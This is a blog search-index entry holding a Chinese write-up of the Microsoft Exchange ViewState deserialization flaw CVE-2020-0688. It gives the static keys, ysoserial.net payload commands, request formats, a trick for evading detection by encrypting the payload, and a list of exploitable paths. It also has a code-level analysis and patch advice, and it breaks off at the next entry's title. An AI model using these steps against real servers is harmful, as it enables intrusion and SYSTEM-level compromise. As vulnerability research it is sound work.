<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>CVE-2020-0688-Exchange服务的远程代码执行漏洞</title>
    <url>/2020/05/04/CVE-2020-0688-Exchange%E6%9C%8D%E5%8A%A1%E7%9A%84%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h1><p>Microsoft Exchange Server是微软公司推出的一套商业电子邮件系统，因其稳定、易用、安全等特点在全球多个行业被广泛地应用。<br>所有Microsoft Exchange Server在安装后的web.config文件中都拥有相同的validationKey和decryptionKey，而这些密钥是用于保证ViewState的安全性。由于使用了静态密钥，经过身份验证的攻击者可以欺骗目标服务器反序列化恶意创建的__VIEWSTATE数据。在YSoSerial.net的帮助下，攻击者可以在Exchange Control Panel web应用上执行任意.net代码。Exchange 是以SYSTEM权限启用的IIS，因此普通登录用户也可通过反序列化达到提权的目的，进而可以获取域管理的权限。</p>
<h1 id="0x02-影响范围"><a href="#0x02-影响范围" class="headerlink" title="0x02 影响范围"></a>0x02 影响范围</h1><ul>
<li>Microsoft Exchange Server 2010 Service Pack 3</li>
<li>Microsoft Exchange Server 2013</li>
<li>Microsoft Exchange Server 2016</li>
<li>Microsoft Exchange Server 2019</li>
</ul>
<p><strong>注意：Exchange Server 2010默认使用.net v2.0，而ysoserial.net对.net v2.0的兼容性并不良好，导致漏洞利用难度高。</strong></p>
<h1 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h1><p>复现环境：<br>Windows Server 2012R2<br>Exchange Server 2016</p>
<p>普通域用户：<br>nsfocus\liuruo</p>
<p>想要成功利用漏洞共需4个关键参数：</p>
<ul>
<li>validationkey = CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF   （默认不变）</li>
<li>validationalg = SHA1    （默认不变）</li>
<li>__VIEWSTATEGENERATOR        （从返回包中提取）</li>
<li>ASP.NET_SessionId            （从Cookie中提取）</li>
</ul>
<h2 id="基础利用"><a href="#基础利用" class="headerlink" title="基础利用"></a>基础利用</h2><p>在Web.config路径<code>C:\Program Files\Microsoft\Exchange Server\V15\ClientAccess\ecp\web.config</code>，可获得前两个关键参数，这两个参数是全版本不变的。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">validationkey &#x3D; CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF</span><br><span class="line">validationalg &#x3D; SHA1</span><br></pre></td></tr></table></figure>
<p>![c19fba99cd6f99d73c6bfea567147a13](CVE-2020-0688-Exchange服务的远程代码执行漏洞.resources/图片 1.png)</p>
<p>然后访问<code>/ecp/default.aspx</code>，从返回包中获得<code>__VIEWSTATEGENERATOR</code>参数。<br><img src="/2020/05/04/CVE-2020-0688-Exchange%E6%9C%8D%E5%8A%A1%E7%9A%84%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/DD8B952B-38FF-4954-A860-6499659078C1.png" alt="f73bf607cae703b85c8914e71d518d0b"></p>
<p>从cookie中获得<code>ASP.NET_SessionId</code>。<br><img src="/2020/05/04/CVE-2020-0688-Exchange%E6%9C%8D%E5%8A%A1%E7%9A%84%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/46B56E08-194A-4F1F-9C59-C3EBFF2FBD51.png" alt="b953b748f010506529549e742f45bad9"></p>
<p>使用ysoserial.net工具生成反序列化payload。<br>工具下载地址：<br><a href="https://github.com/pwntester/ysoserial.net/" target="_blank" rel="noopener">https://github.com/pwntester/ysoserial.net/</a><br>生成payload命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ysoserial.exe -p ViewState -g TextFormattingRunProperties -c &quot;calc.exe&quot; --validationalg&#x3D;&quot;SHA1&quot; --validationkey&#x3D;&quot;CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF&quot; --generator&#x3D;&quot;B97B4E27&quot; --viewstateuserkey&#x3D;&quot;2fdc8b0d-dcfb-4d0a-b464-95b9a2dcc968&quot; --isdebug –-islegacy</span><br></pre></td></tr></table></figure>
<p>![c4cc4972a88f2a9e1e58794b182735f4](CVE-2020-0688-Exchange服务的远程代码执行漏洞.resources/图片 2.png)</p>
<p>构造以下URL，使用生成的payload替换<code>&lt;ViewState&gt;</code>，以GET请求发送给服务器即可。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;ip:port&#x2F;ecp&#x2F;default.aspx?__VIEWSTATEGENERATOR&#x3D;&lt;generator&gt;&amp;__VIEWSTATE&#x3D;&lt;ViewState&gt;</span><br></pre></td></tr></table></figure>
<p><strong>注意：使用Burpsuite对payload进行关键字符URL编码，而不是全部URL编码</strong><br><img src="/2020/05/04/CVE-2020-0688-Exchange%E6%9C%8D%E5%8A%A1%E7%9A%84%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/E36A86D7-D9E5-4C09-912C-E0126C3B13B2.png" alt="8fe55de456e0e5be5f2f4903c13d4a36"><br>虽然服务器返回500错误，但是攻击已经成功，可见w3wp.exe下存在以system权限运行的calc.exe。<br><img src="/2020/05/04/CVE-2020-0688-Exchange%E6%9C%8D%E5%8A%A1%E7%9A%84%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/F83FAADD-44A7-4B3B-8F81-AB95B6CAFD9E.png" alt="587eb6e58a4ae92d276c1f9b81ae22c5"></p>
<h2 id="高级利用"><a href="#高级利用" class="headerlink" title="高级利用"></a>高级利用</h2><h3 id="更改请求URL"><a href="#更改请求URL" class="headerlink" title="更改请求URL"></a>更改请求URL</h3><p>从基础利用中可知，需要访问<code>/ecp/default.aspx</code>并获得<code>__VIEWSTATEGENERATOR</code>参数。经过测试，并非所有版本Exchange Server都会返回该参数，但即使不返回该参数值，也是可以使用<code>__VIEWSTATEGENERATOR=B97B4E27</code>生成payload完成攻击。</p>
<p>大量测试后发现，几乎每一个.aspx后缀的URL都有一个对应的<code>__VIEWSTATEGENERATOR</code>参数值，并且.slab后缀的URL也可以触发漏洞。经过测试后可利用的URL在本文最后附录中列出。</p>
<p>当然ysoserial.net工具提供了path和apppath参数，供使用者在未知<code>__VIEWSTATEGENERATOR</code>参数的情况下，设置攻击路径。</p>
<p>如果要攻击<code>/ecp/PersonalSettings/HomePage.aspx</code>路径，则需要这样生成payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ysoserial.exe -p ViewState -g TextFormattingRunProperties -c &quot;calc.exe&quot; --validationalg&#x3D;&quot;SHA1&quot; --path&#x3D;&quot;&#x2F;ecp&#x2F;PersonalSettings&#x2F;HomePage.aspx&quot; --apppath&#x3D;&quot;&#x2F;ecp&#x2F;&quot; --validationkey&#x3D;&quot;CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF&quot; --viewstateuserkey&#x3D;&quot;222e5a55-f9ea-4f11-bdcc-8473d3d6b6f6&quot; --isdebug --islegacy</span><br></pre></td></tr></table></figure>
<p><strong>注意：islegacy参数是必须的，另外若不懂怎么设置apppath和path，请阅读<a href="https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/" target="_blank" rel="noopener">这里</a>。</strong></p>
<h3 id="Post请求和ASP-NET-SessionId置空"><a href="#Post请求和ASP-NET-SessionId置空" class="headerlink" title="Post请求和ASP.NET_SessionId置空"></a>Post请求和ASP.NET_SessionId置空</h3><p>需要管理员账户才能访问该页面：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;ecp&#x2F;DLPPolicy&#x2F;ManagePolicyFromISV.aspx</span><br></pre></td></tr></table></figure>
<p>另外经测试<code>ASP.NET_SessionId</code>也由客户端控制，将其置空，则在生成payload时就可以不使用<code>viewstateuserkey</code>参数。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c &quot;calc.exe&quot; --validationalg&#x3D;&quot;SHA1&quot; --path&#x3D;&quot;&#x2F;ecp&#x2F;DLPPolicy&#x2F;ManagePolicyFromISV.aspx&quot; --apppath&#x3D;&quot;&#x2F;ecp&#x2F;&quot; --validationkey&#x3D;&quot;CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF&quot; --isdebug --islegacy</span><br></pre></td></tr></table></figure>
<p><img src="/2020/05/04/CVE-2020-0688-Exchange%E6%9C%8D%E5%8A%A1%E7%9A%84%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/BF12954D-9C1A-44CC-BF55-CF01B90F42F6.png" alt="ed0409b395f10d25a851bf652142bb5a"></p>
<h3 id="加密-VIEWSTATE"><a href="#加密-VIEWSTATE" class="headerlink" title="加密__VIEWSTATE"></a>加密__VIEWSTATE</h3><p>使用ysoserial.net生成大量payload就可以发现，payload的前几个字节存在固定特征<code>\wEy</code>，防护设备可以很轻易的识别到。但经过查阅相关知识后发现，当服务使用.NET Framework 4.0及更低版本（在v2.0到v4.0上测试）时，若我们已知验证密钥及其算法，那么我们可以在请求中添加<code>__VIEWSTATEENCRYPTED</code> 参数（空值即可），来对<code>__VIEWSTATE</code>参数进行加密，以绕过简单的防护规则。</p>
<p>从最开始的Web.config文件中，我们不仅获得了validationKey和validation，还获得了decryptionKey和decryption。所以我们可以使用ysoserial.net的isencrypted参数生成加密的payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c &quot;calc.exe&quot; --validationalg&#x3D;&quot;SHA1&quot; --decryptionalg&#x3D;&quot;3DES&quot; --validationkey&#x3D;&quot;CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF&quot; --decryptionkey&#x3D;&quot;E9D2490BD0075B51D1BA5288514514AF&quot; --generator&#x3D;&quot;B97B4E27&quot; --viewstateuserkey&#x3D;&quot;df0c4af4-8be5-4000-a15b-abf2066186dd&quot; --isencrypted -–islegacy</span><br></pre></td></tr></table></figure>
<p>发送加密后的攻击请求数据包即可完成攻击。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;ecp&#x2F;default.aspx?__VIEWSTATEENCRYPTED&#x3D;&amp;__VIEWSTATE&#x3D;&lt;payload&gt;</span><br></pre></td></tr></table></figure>
<p><img src="/2020/05/04/CVE-2020-0688-Exchange%E6%9C%8D%E5%8A%A1%E7%9A%84%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/1926661E-0DB7-40E0-90F9-CD13C82C9D81.png" alt="04f6664940caa5dbeb1cc88535e2ff35"></p>
<h1 id="0x04-漏洞分析"><a href="#0x04-漏洞分析" class="headerlink" title="0x04 漏洞分析"></a>0x04 漏洞分析</h1><h2 id="消息认证码校验简述"><a href="#消息认证码校验简述" class="headerlink" title="消息认证码校验简述"></a>消息认证码校验简述</h2><p>在ASP.NET Web应用程序中通过<code>__VIEWSTATE</code>参数维持对象的ViewState视图状态。.NET Framework会对<code>__VIEWSTATE</code>参数进行加密和签名。如果启用了消息认证码(message authentication code)验证机制，则会获取相关的machineKey配置中的参数值去验证签名。具体机制可能会在之后的文章中补充1。其中相关的密钥一般存储在web.config或者machine.config配置文件中。<br>这里我们可以查看Exchange Server 2016中的配置文件进行说明，在pages标签中的enableViewStateMac属性值设置为true即启用了消息认证码验证机制。相应的配置信息则在machineKey标签中，其中包括验证密钥validationKey、解密密钥decryptionKey以及加解密算法。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;configuration&gt;</span><br><span class="line">[...]</span><br><span class="line">	&lt;pages theme&#x3D;&quot;default&quot; validateRequest&#x3D;&quot;true&quot; enableEventValidation&#x3D;&quot;false&quot; enableSessionState&#x3D;&quot;false&quot; enableViewState&#x3D;&quot;false&quot; enableViewStateMac&#x3D;&quot;true&quot; autoEventWireup&#x3D;&quot;false&quot;&gt;</span><br><span class="line">      &lt;controls&gt;</span><br><span class="line">        &lt;add tagPrefix&#x3D;&quot;asp&quot; namespace&#x3D;&quot;System.Web.UI&quot; assembly&#x3D;&quot;System.Web.Extensions, Version&#x3D;3.5.0.0, Culture&#x3D;neutral, PublicKeyToken&#x3D;31bf3856ad364e35&quot; &#x2F;&gt;</span><br><span class="line">        &lt;add tagPrefix&#x3D;&quot;ajaxToolkit&quot; namespace&#x3D;&quot;AjaxControlToolkit&quot; assembly&#x3D;&quot;AjaxControlToolkit&quot; &#x2F;&gt;</span><br><span class="line">        &lt;add tagPrefix&#x3D;&quot;ecp&quot; namespace&#x3D;&quot;Microsoft.Exchange.Management.ControlPanel&quot; assembly&#x3D;&quot;Microsoft.Exchange.Management.ControlPanel&quot; &#x2F;&gt;</span><br><span class="line">        &lt;add tagPrefix&#x3D;&quot;ecp&quot; namespace&#x3D;&quot;Microsoft.Exchange.Management.ControlPanel.WebControls&quot; assembly&#x3D;&quot;Microsoft.Exchange.Management.ControlPanel&quot; &#x2F;&gt;</span><br><span class="line">        &lt;add tagPrefix&#x3D;&quot;ecp&quot; namespace&#x3D;&quot;Microsoft.Exchange.Management.ControlPanel.Reporting&quot; assembly&#x3D;&quot;Microsoft.Exchange.Management.ControlPanel&quot; &#x2F;&gt;</span><br><span class="line">        &lt;add tagPrefix&#x3D;&quot;asp&quot; namespace&#x3D;&quot;System.Web.UI.WebControls&quot; assembly&#x3D;&quot;System.Web.Extensions, Version&#x3D;3.5.0.0, Culture&#x3D;neutral, PublicKeyToken&#x3D;31BF3856AD364E35&quot; &#x2F;&gt;</span><br><span class="line">        &lt;add tagPrefix&#x3D;&quot;CsmSdk&quot; namespace&#x3D;&quot;Microsoft.Office.CsmSdk.Controls&quot; assembly&#x3D;&quot;Microsoft.Office.CsmSdk&quot; &#x2F;&gt;</span><br><span class="line">      &lt;&#x2F;controls&gt;</span><br><span class="line">    &lt;&#x2F;pages&gt;</span><br><span class="line">[...]</span><br><span class="line">&lt;system.web&gt;</span><br><span class="line">    &lt;machineKey validationKey&#x3D;&quot;&quot; decryptionKey&#x3D;&quot;&quot; validation&#x3D;&quot;SHA1&quot; decryption&#x3D;&quot;3DES&quot; &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;system.web&gt;</span><br><span class="line">[...]</span><br><span class="line">&lt;&#x2F;configuration&gt;</span><br></pre></td></tr></table></figure>

<h2 id="ViewState反序列化过程"><a href="#ViewState反序列化过程" class="headerlink" title="ViewState反序列化过程"></a>ViewState反序列化过程</h2><p>一般情况ASP.NET会对aspx进行动态编译在.NET Framework下运行会生成临时的文件，生成的Assembly可以暂时成为App_Web_aspx.dll。以<code>/ecp/default.aspx</code>文件为例，在<code>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Temporary ASP.NET Files\ecp\67f1ad38\e5546d0a</code>目录中有大量的<code>default.aspx.xxxxx.compiled</code>文件，这些文件内容是XML文本，描述了所对应的原始aspx文件路径和在当前目录编译生成的dll文件。<br><img src="/2020/05/04/CVE-2020-0688-Exchange%E6%9C%8D%E5%8A%A1%E7%9A%84%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/906CB66D-F42F-4926-8D5C-10046A2B6F0F.png" alt="97938f3736ceaec8cd1c2fbc526bd6f0"><br><img src="/2020/05/04/CVE-2020-0688-Exchange%E6%9C%8D%E5%8A%A1%E7%9A%84%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/A593881D-09B8-404A-AA99-52A1250D69D9.png" alt="10cd318d7af45807e7bea186ea83b45f"><br>这里<code>/ecp/default.aspx</code>所对应的DLL文件就是<code>App_Web_pclxrjtl.dll</code>，通过dnSpy反编译如下图所示。<br><img src="/2020/05/04/CVE-2020-0688-Exchange%E6%9C%8D%E5%8A%A1%E7%9A%84%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/9BF1A072-E72C-4CA5-A2EF-A41106996D5F.png" alt="5d9da25f8bd3f157155c576ded8cacd0"><br>当前default_aspx类通过多重继承，最终继承System.Web.dll中System.Web.UI命名空间下的Page类。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ASP.default_aspx</span><br><span class="line">——&gt;Microsoft.Exchange.Management.ControlPanel._Default</span><br><span class="line">——&gt;Microsoft.Exchange.Management.ControlPanel.EcpPage</span><br><span class="line">——&gt;System.Web.UI.Page</span><br></pre></td></tr></table></figure>
<p>在处理请求的时候会调用<code>System.Web.dll!System.Web.UI.Page.ProcessRequestMain</code>方法.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;Code snippet 0</span><br><span class="line">private void ProcessRequestMain(bool includeStagesBeforeAsyncPoint, bool includeStagesAfterAsyncPoint)</span><br><span class="line">&#123;</span><br><span class="line">[...]</span><br><span class="line">    if (EtwTrace.IsTraceEnabled(5, 4))</span><br><span class="line">    &#123;</span><br><span class="line">        EtwTrace.Trace(EtwTraceType.ETW_TYPE_PAGE_LOAD_VIEWSTATE_ENTER, this._context.WorkerRequest);</span><br><span class="line">    &#125;</span><br><span class="line">    this.LoadAllState();&#x2F;&#x2F;[0]</span><br><span class="line">    if (EtwTrace.IsTraceEnabled(5, 4))</span><br><span class="line">    &#123;</span><br><span class="line">        EtwTrace.Trace(EtwTraceType.ETW_TYPE_PAGE_LOAD_VIEWSTATE_LEAVE, this._context.WorkerRequest);</span><br><span class="line">    &#125;</span><br><span class="line">[...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在<code>ProcessRequestMain</code>方法的[0]处调用<code>LoadAllState</code>方法载入请求中的各种状态。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;Code snippet 1</span><br><span class="line">private void LoadAllState()</span><br><span class="line">&#123;</span><br><span class="line">    object obj &#x3D; this.LoadPageStateFromPersistenceMedium();&#x2F;&#x2F;[1]</span><br><span class="line">[...]    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>紧接着调用<code>LoadPageStateFromPersistenceMedium</code>方法[1]中的load方法[2]。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;Code snippet 2</span><br><span class="line">protected internal virtual object LoadPageStateFromPersistenceMedium()</span><br><span class="line">&#123;</span><br><span class="line">    PageStatePersister pageStatePersister &#x3D; this.PageStatePersister;&#x2F;&#x2F;[3]</span><br><span class="line">    try</span><br><span class="line">    &#123;</span><br><span class="line">        pageStatePersister.Load();&#x2F;&#x2F;[2]</span><br><span class="line">    &#125;</span><br><span class="line">    catch (HttpException ex)</span><br><span class="line">    &#123;</span><br><span class="line">        if (this._pageFlags[8])</span><br><span class="line">        &#123;</span><br><span class="line">            return null;</span><br><span class="line">        &#125;</span><br><span class="line">        if (this.ShouldSuppressMacValidationException(ex))&#x2F;&#x2F;[5]</span><br><span class="line">        &#123;</span><br><span class="line">            if (this.Context !&#x3D; null &amp;&amp; this.Context.TraceIsEnabled)</span><br><span class="line">            &#123;</span><br><span class="line">                this.Trace.Write(&quot;aspx.page&quot;, &quot;Ignoring page state&quot;, ex);</span><br><span class="line">            &#125;</span><br><span class="line">            this.ViewStateMacValidationErrorWasSuppressed &#x3D; true;</span><br><span class="line">            return null;</span><br><span class="line">        &#125;</span><br><span class="line">        ex.WebEventCode &#x3D; 3002;</span><br><span class="line">        throw;</span><br><span class="line">    &#125;</span><br><span class="line">    return new Pair(pageStatePersister.ControlState, pageStatePersister.ViewState);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>调用load方法的对象是<code>PageStatePersister</code>抽象类[3]，<code>HiddenFieldPageStatePersister</code>实现了该抽象类。最终的反序列化在[4]处触发。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;Code snippet 3</span><br><span class="line">public class HiddenFieldPageStatePersister : PageStatePersister</span><br><span class="line">    &#123;</span><br><span class="line">        public HiddenFieldPageStatePersister(Page page) : base(page)</span><br><span class="line">        &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        public override void Load()</span><br><span class="line">        &#123;</span><br><span class="line">            if (base.Page.RequestValueCollection &#x3D;&#x3D; null)</span><br><span class="line">            &#123;</span><br><span class="line">                return;</span><br><span class="line">            &#125;</span><br><span class="line">            string text &#x3D; null;</span><br><span class="line">            try</span><br><span class="line">            &#123;</span><br><span class="line">                text &#x3D; base.Page.RequestViewStateString;</span><br><span class="line">                if (!string.IsNullOrEmpty(text) || !string.IsNullOrEmpty(base.Page.ViewStateUserKey))</span><br><span class="line">                &#123;</span><br><span class="line">                    Pair pair &#x3D; (Pair)Util.DeserializeWithAssert(base.StateFormatter2, text, Purpose.WebForms_HiddenFieldPageStatePersister_ClientState);&#x2F;&#x2F;[4]</span><br><span class="line">                    base.ViewState &#x3D; pair.First;</span><br><span class="line">                    base.ControlState &#x3D; pair.Second;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            catch (Exception ex)</span><br><span class="line">            &#123;</span><br><span class="line">                if (ex.InnerException is ViewStateException)</span><br><span class="line">                &#123;</span><br><span class="line">                    throw;</span><br><span class="line">                &#125;</span><br><span class="line">                ViewStateException.ThrowViewStateError(ex, text);</span><br><span class="line">            &#125;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure>
<p>非必要的<code>__VIEWSTATEGENERATOR</code>参数<br>在我进行审计代码的时发现，触发反序列化漏洞时并不需要<code>__VIEWSTATEGENERATOR</code>参数。具体验证该参数的代码实现请大家参看代码片段2的[5]处。事实上，在代码片段3中触发反序列化之后会抛出异常，最后并没有执行到[6]处。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">internal bool ShouldSuppressMacValidationException(Exception e)</span><br><span class="line">&#123;</span><br><span class="line">    if (!EnableViewStateMacRegistryHelper.SuppressMacValidationErrorsFromCrossPagePostbacks)</span><br><span class="line">    &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    if (ViewStateException.IsMacValidationException(e))</span><br><span class="line">    &#123;</span><br><span class="line">        if (EnableViewStateMacRegistryHelper.SuppressMacValidationErrorsAlways)</span><br><span class="line">        &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">        if (!string.IsNullOrEmpty(this.ViewStateUserKey))</span><br><span class="line">        &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        if (this._requestValueCollection &#x3D;&#x3D; null)</span><br><span class="line">        &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">        if (!this.VerifyClientStateIdentifier(this._requestValueCollection[&quot;__VIEWSTATEGENERATOR&quot;]))&#x2F;&#x2F;[6]</span><br><span class="line">        &#123;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return false;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="0x05-漏洞防护"><a href="#0x05-漏洞防护" class="headerlink" title="0x05 漏洞防护"></a>0x05 漏洞防护</h1><p>微软官方已针对受支持的产品版本发布了修复该漏洞的安全补丁，建议受影响用户开启系统自动更新安装补丁进行防护。</p>
<h1 id="0x06-参考链接"><a href="#0x06-参考链接" class="headerlink" title="0x06 参考链接"></a>0x06 参考链接</h1><ol>
<li><p><a href="https://www.zerodayinitiative.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys" target="_blank" rel="noopener">https://www.zerodayinitiative.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys</a></p>
</li>
<li><p><a href="https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/" target="_blank" rel="noopener">https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/</a></p>
</li>
<li><p><a href="https://www.yuque.com/zhiyi01/blog/cve-2020-0688?from=timeline&isappinstalled=0" target="_blank" rel="noopener">https://www.yuque.com/zhiyi01/blog/cve-2020-0688?from=timeline&amp;isappinstalled=0</a></p>
</li>
</ol>
<h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><p>经过简单测试，已知可利用路径：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;ecp&#x2F;default.aspx</span><br><span class="line">__VIEWSTATEGENERATOR&#x3D;B97B4E27</span><br><span class="line"></span><br><span class="line">&#x2F;ecp&#x2F;PersonalSettings&#x2F;HomePage.aspx?showhelp&#x3D;false&amp;</span><br><span class="line">__VIEWSTATEGENERATOR&#x3D;1D01FD4E</span><br><span class="line"></span><br><span class="line">&#x2F;ecp&#x2F;PersonalSettings&#x2F;HomePage.aspx?showhelp&#x3D;false&amp;</span><br><span class="line">__VIEWSTATEGENERATOR&#x3D;1D01FD4E</span><br><span class="line"></span><br><span class="line">&#x2F;ecp&#x2F;Organize&#x2F;AutomaticReplies.slab?showhelp&#x3D;false&amp;</span><br><span class="line">__VIEWSTATEGENERATOR&#x3D;FD338EE0</span><br><span class="line"></span><br><span class="line">&#x2F;ecp&#x2F;RulesEditor&#x2F;InboxRules.slab?showhelp&#x3D;false&amp;</span><br><span class="line">__VIEWSTATEGENERATOR&#x3D;FD338EE0</span><br><span class="line"></span><br><span class="line">&#x2F;ecp&#x2F;Organize&#x2F;DeliveryReports.slab?showhelp&#x3D;false&amp;</span><br><span class="line">__VIEWSTATEGENERATOR&#x3D;FD338EE0</span><br><span class="line"></span><br><span class="line">&#x2F;ecp&#x2F;MyGroups&#x2F;PersonalGroups.aspx?showhelp&#x3D;false&amp;</span><br><span class="line">__VIEWSTATEGENERATOR&#x3D;A767F62B</span><br><span class="line"></span><br><span class="line">&#x2F;ecp&#x2F;MyGroups&#x2F;ViewDistributionGroup.aspx?pwmcid&#x3D;1&amp;id&#x3D;38f4bec5-704f-4272-a654-95d53150e2ae&amp;ReturnObjectType&#x3D;1</span><br><span class="line">__VIEWSTATEGENERATOR&#x3D;321473B8</span><br><span class="line"></span><br><span class="line">&#x2F;ecp&#x2F;Customize&#x2F;Messaging.aspx?showhelp&#x3D;false&amp;</span><br><span class="line">__VIEWSTATEGENERATOR&#x3D;9C5731F0</span><br><span class="line"></span><br><span class="line">&#x2F;ecp&#x2F;Customize&#x2F;General.aspx?showhelp&#x3D;false&amp;</span><br><span class="line">__VIEWSTATEGENERATOR&#x3D;72B13321</span><br><span class="line"></span><br><span class="line">&#x2F;ecp&#x2F;Customize&#x2F;Calendar.aspx?showhelp&#x3D;false&amp;</span><br><span class="line">__VIEWSTATEGENERATOR&#x3D;4AD51055</span><br><span class="line"></span><br><span class="line">&#x2F;ecp&#x2F;Customize&#x2F;SentItems.aspx?showhelp&#x3D;false&amp;</span><br><span class="line"> __VIEWSTATEGENERATOR&#x3D;4466B13F</span><br><span class="line"></span><br><span class="line">&#x2F;ecp&#x2F;PersonalSettings&#x2F;Password.aspx?showhelp&#x3D;false&amp;</span><br><span class="line">__VIEWSTATEGENERATOR&#x3D;59543DCA</span><br><span class="line"></span><br><span class="line">&#x2F;ecp&#x2F;SMS&#x2F;TextMessaging.slab?showhelp&#x3D;false&amp;</span><br><span class="line">__VIEWSTATEGENERATOR&#x3D;FD338EE0</span><br><span class="line"></span><br><span class="line">&#x2F;ecp&#x2F;TroubleShooting&#x2F;MobileDevices.slab?showhelp&#x3D;false&amp;</span><br><span class="line">__VIEWSTATEGENERATOR&#x3D;FD338EE0</span><br><span class="line"></span><br><span class="line">&#x2F;ecp&#x2F;Customize&#x2F;Regional.aspx?showhelp&#x3D;false&amp;</span><br><span class="line">__VIEWSTATEGENERATOR&#x3D;9097CD08</span><br><span class="line"></span><br><span class="line">&#x2F;ecp&#x2F;MyGroups&#x2F;SearchAllGroups.slab?pwmcid&#x3D;3&amp;ReturnObjectType&#x3D;1</span><br><span class="line">__VIEWSTATEGENERATOR&#x3D;FD338EE0</span><br><span class="line"></span><br><span class="line">&#x2F;ecp&#x2F;Security&#x2F;BlockOrAllow.aspx?showhelp&#x3D;false&amp;</span><br><span class="line">__VIEWSTATEGENERATOR&#x3D;362253EF</span><br></pre></td></tr></table></figure>

<h1 id="更新信息"><a href="#更新信息" class="headerlink" title="更新信息"></a>更新信息</h1><table>
<thead>
<tr>
<th>修订时间</th>
<th>修订人</th>
<th>简述</th>
</tr>
</thead>
<tbody><tr>
<td>2020.02.27</td>
<td>3t2ugg1e</td>
<td>创建文章</td>
</tr>
<tr>
<td>2020.03.01</td>
<td>3t2ugg1e</td>
<td>新增漏洞分析</td>
</tr>
</tbody></table>
]]></content>
  </entry>
  <entry>
    <title>CVE-2020-1947-ApacheShardingSphere远程代码执行漏洞分析</title>
